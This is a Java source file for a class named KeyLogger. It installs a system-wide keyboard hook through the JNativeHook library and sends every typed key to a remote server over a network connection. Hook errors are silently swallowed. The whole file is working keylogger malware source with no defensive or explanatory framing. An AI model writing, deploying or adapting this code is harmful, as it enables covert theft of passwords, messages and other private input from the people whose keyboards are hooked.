package keylogger;

import network.Connection;
import network.Message;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyLogger implements NativeKeyListener {

    boolean isRunning = false;
    Connection server;

    public KeyLogger(Connection c) {
        this.server = c;
    }

    void start() {
        if(!isRunning) {
            try {
                GlobalScreen.addNativeKeyListener(new KeyLogger(server));
                GlobalScreen.registerNativeHook();
            } catch(NativeHookException e) {
                // Silence is golden
                isRunning = false;
            }
            isRunning = true;
        }
    }

    void stop() {
        if(isRunning) {
            try {
                GlobalScreen.unregisterNativeHook();
                isRunning = false;
            } catch(NativeHookException e) {
                // Silence is golden
            }
        }
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
        Message keyPressed = new Message("key-typed", nativeKeyEvent);
        server.sendMessage(keyPressed);
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {

    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {

    }
}
